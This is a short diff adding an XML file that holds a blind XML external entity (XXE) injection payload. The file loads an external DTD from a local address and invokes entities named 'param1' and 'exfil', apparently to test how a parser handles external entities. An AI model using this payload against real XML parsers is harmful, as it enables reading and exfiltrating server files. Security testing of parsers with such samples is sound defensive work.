@@ -1,0 +1,9 @@
+<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY % sp SYSTEM "http://127.0.0.1/dtd.xml">
+%sp;
+%param1;
+&exfil;
+]>
+<r></r>
